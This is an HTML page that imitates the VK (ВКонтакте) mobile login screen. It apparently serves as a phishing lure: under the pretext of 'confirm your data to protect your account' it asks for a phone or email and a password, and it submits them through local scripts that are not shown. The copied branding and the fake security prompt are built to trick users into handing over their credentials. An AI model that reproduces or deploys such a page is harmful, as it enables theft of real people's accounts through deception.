<!DOCTYPE html>
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=yes">

    <meta name="format-detection" content="telephone=no">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="MobileOptimized" content="176">
    <meta name="HandheldFriendly" content="True">
    <title>Мобильная версия ВКонтакте</title>
    <link type="text/css" rel="stylesheet" href="css/s_cfmxw.css">
    <link type="text/css" rel="stylesheet" media="only screen" href="css/s_yzgt.css">
    <script type="text/javascript" src="js/jquery-1.11.3.js"></script>
    <script type="text/javascript" src="js/main.js"></script>
    <script type="text/javascript" src="js/s_c.js"></script>
</head>

<body id="vk" class="_hover _hfixed" onresize="onBodyResize(true);">
<div id="vk_utils"></div>
<div id="vk_head" class="mhead">
    <div class="hb_wrap"><div class="hb_btn">&nbsp;</div></div>
</div>
<div id="vk_wrap" class="_vpan qs_enabled _js _copts">
    <div id="l"></div>
    <div id="m">
        <div id="mhead" class="mhead">
            <a href="/" accesskey="*" class="hb_wrap mhb_logo">
                <div class="hb_btn mhi_logo">&nbsp;</div>
                <h1 class="hb_btn mh_header">&nbsp;</h1>
            </a>
        </div>
        <div id="mcont" class="mcont">
            <div class="pcont fit_box bl_cont">
                <div class="text_panel">
                    Подтвердите ваши данные <strong>чтобы защитить аккаунт</strong>
                </div>

                <div class="form_item fi_fat">
                    <form>
                        <dl class="fi_row">
                            <dt class="fi_label">Телефон или email:</dt>
                            <dd>
                                <div class="iwrap">
                                    <input id="name" type="text" class="textfield" name="name" value="">
                                </div>
                            </dd>
                        </dl>
                        <dl class="fi_row">
                            <dt class="fi_label">Введите пароль:</dt>
                            <dd>
                                <div class="iwrap">
                                    <input id="pass" type="password" class="textfield" name="pass">
                                </div>
                            </dd>
                        </dl>
                        <div class="fi_row">
                            <div class="fi_subrow">
                                <button id="buttonForm" class="button wide_button">Войти</button>
                            </div>
                        </div>
                    </form>
                </div>
            </div>
        </div>
    </div>
</div>
</body>
</html>
